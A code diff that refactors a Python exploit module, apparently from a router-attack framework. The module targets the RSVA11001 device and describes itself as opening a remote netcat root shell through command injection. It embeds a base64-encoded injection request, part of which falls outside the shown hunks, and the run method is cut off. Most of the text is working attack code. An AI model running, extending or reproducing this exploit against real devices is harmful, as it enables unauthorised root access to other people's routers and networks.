@@ -2,13 +2,13 @@ import socket
 import util
 from ..router_vuln import RouterVuln
 
-__router__ = 'RSVA11001'
-__vuln__='Backdoor Root'
-class GetBackdoor(RouterVuln):
+class rsva_backdoor(RouterVuln):
 	"""Execute a remote netcat shell through command injection
 	   http://www.exploit-db.com/exploits/24892
 	"""
 	def __init__(self):
+		self.router = 'RSVA11001'
+		self.vuln   = 'Backdoor Root'
 		self.inject = "UkVNT1RFIEhJX1NSREtfVElNRV9TZXRUaW1lU2V0QXR0ciBNQ1RQLzEuMA0KQ"\
 					"1NlcTo2Ng0KQWNjZXB0OnRleHQvSERQDQpDb250ZW50LVR5cGU6dGV4dC9IRFAN"\
 					"CkZ1bmMtVmVyc2lvbjoweDEwDQpDb250ZW50LUxlbmd0aDoxMjQNCg0KU2VnbWV"\
@@ -19,7 +19,7 @@ class GetBackdoor(RouterVuln):
 						 "o0MQ0KQWNjZXB0OnRleHQvSERQDQpDb250ZW50LVR5cGU6dGV4dC9IRFAN"\
 						 "CkZ1bmMtVmVyc2lvbjoweDEwDQpDb250ZW50LUxlbmd0aDoxNQ0KDQpTZW"\
 						 "dtZW50LU51bTowDQo="
-		super(GetBackdoor,self).__init__()
+		super(rsva_backdoor,self).__init__()
 
 	def run(self):
 		try:
